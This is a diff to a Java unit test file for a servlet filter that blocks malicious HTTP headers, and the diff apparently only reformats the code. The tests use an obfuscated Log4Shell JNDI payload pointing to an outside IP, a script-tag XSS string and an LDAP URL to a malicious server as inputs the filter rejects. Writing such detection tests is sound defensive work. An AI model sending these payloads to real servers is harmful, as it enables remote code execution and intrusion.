@@ -16,19 +16,22 @@ import org.mockito.Mock;
 import org.mockito.junit.jupiter.MockitoExtension;
 
 /**
- * Tests for {@link MaliciousHeaderFilter} - security filter that blocks exploit attempts. Verifies
- * detection of Log4Shell, XSS, and other attack vectors.
+ * Tests for {@link MaliciousHeaderFilter} - security filter that blocks exploit
+ * attempts. Verifies detection of Log4Shell, XSS, and other attack vectors.
  */
 @ExtendWith(MockitoExtension.class)
 class MaliciousHeaderFilterTest {
 
   private MaliciousHeaderFilter filter;
 
-  @Mock private HttpServletRequest request;
+  @Mock
+  private HttpServletRequest request;
 
-  @Mock private HttpServletResponse response;
+  @Mock
+  private HttpServletResponse response;
 
-  @Mock private FilterChain filterChain;
+  @Mock
+  private FilterChain filterChain;
 
   private StringWriter responseWriter;
 
@@ -57,15 +60,13 @@ class MaliciousHeaderFilterTest {
     verify(response).setStatus(HttpServletResponse.SC_BAD_REQUEST);
     verify(response).setContentType("application/json");
     verify(filterChain, never()).doFilter(any(), any());
-    assertEquals(
-        "{\"error\":\"Malicious request detected and blocked\"}", responseWriter.toString());
+    assertEquals("{\"error\":\"Malicious request detected and blocked\"}", responseWriter.toString());
   }
 
   @Test
   void shouldBlockObfuscatedLog4ShellAttack() throws Exception {
     // Given: An obfuscated Log4Shell attack (like in production logs)
-    String maliciousPayload =
-        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/Exploit}";
+    String maliciousPayload = "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//31.57.109.131:3306/Exploit}";
     when(request.getHeaderNames())
         .thenReturn(Collections.enumeration(Collections.singletonList("X-Forwarded-Host")));
     when(request.getHeader("X-Forwarded-Host")).thenReturn(maliciousPayload);
@@ -85,8 +86,7 @@ class MaliciousHeaderFilterTest {
   void shouldBlockXSSAttack() throws Exception {
     // Given: A request with XSS payload in header
     String maliciousPayload = "<script>alert('XSS')</script>";
-    when(request.getHeaderNames())
-        .thenReturn(Collections.enumeration(Collections.singletonList("User-Agent")));
+    when(request.getHeaderNames()).thenReturn(Collections.enumeration(Collections.singletonList("User-Agent")));
     when(request.getHeader("User-Agent")).thenReturn(maliciousPayload);
     when(request.getRequestURI()).thenReturn("/api/qa/ask");
     when(request.getMethod()).thenReturn("GET");
@@ -104,8 +104,7 @@ class MaliciousHeaderFilterTest {
   void shouldBlockLDAPProtocol() throws Exception {
     // Given: A request with LDAP protocol in header
     String maliciousPayload = "ldap://malicious.server.com/payload";
-    when(request.getHeaderNames())
-        .thenReturn(Collections.enumeration(Collections.singletonList("Referer")));
+    when(request.getHeaderNames()).thenReturn(Collections.enumeration(Collections.singletonList("Referer")));
     when(request.getHeader("Referer")).thenReturn(maliciousPayload);
     when(request.getRequestURI()).thenReturn("/api/qa/ask");
     when(request.getMethod()).thenReturn("GET");
